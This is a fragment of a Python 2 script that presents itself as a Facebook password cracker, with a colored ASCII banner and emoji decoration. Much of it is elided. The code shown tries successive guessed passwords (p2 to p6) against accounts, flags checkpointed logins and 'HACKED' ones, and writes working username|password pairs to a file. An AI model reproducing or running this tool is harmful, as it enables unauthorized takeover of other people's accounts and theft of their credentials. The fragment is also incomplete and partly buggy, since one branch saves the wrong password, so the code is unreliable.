...
\033[1;91m╋╋┏┳━━━┳━┓┏━┳━━━┳━━━┓
\033[1;92m╋╋┃┃┏━┓┃┃┗┛┃┃┏━━┫┏━┓┃
\033[1;93m╋╋┃┃┃╋┃┃┏┓┏┓┃┗━━┫┗━━┓FAST CRACK
\033[1;94m┏┓┃┃┗━┛┃┃┃┃┃┃┏━━┻━━┓┃  WITH
\033[1;95m┃┗┛┃┏━┓┃┃┃┃┃┃┗━━┫┗━┛┃CHOICE PASS
\033[1;96m┗━━┻┛╋┗┻┛┗┛┗┻━━━┻━━━┛
💕🍃🌹🍃💕
💕.•°``°•.¸.•°``°•.💕
   (   🍃 🌹 🍃   ) 💕
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;;93m [JAMES-CP] ' + user + ' |\x1b[0m ' + p2
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;93m [JAMES-CP] ' + user + ' |\x1b[0m ' + p3
                        ...
                        if 'access_token' in q:
                            ...
                            print '\x1b[1;93m[JAMES-CP] ' + user + ' |\x1b[0m ' + p4
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[JAMES-HACKED] ' + user + ' |\x1b[0m ' + p5
                                cek = open('save/hack.txt', 'a')
                                cek.write(user + '|' + p5 + '\n')
                                cek.close()
                                oks.append(user + p5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;93m [JAMES-CP] ' + user + ' |\x1b[0m ' + p5
                                ...
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[JAMES-HACKED] ' + user + ' |\x1b[0m ' + p6
                                    cek = open('save/hack.txt', 'a')
                                    cek.write(user + '|' + p6 + '\n')
                                    cek.close()
                                    oks.append(user + p5)
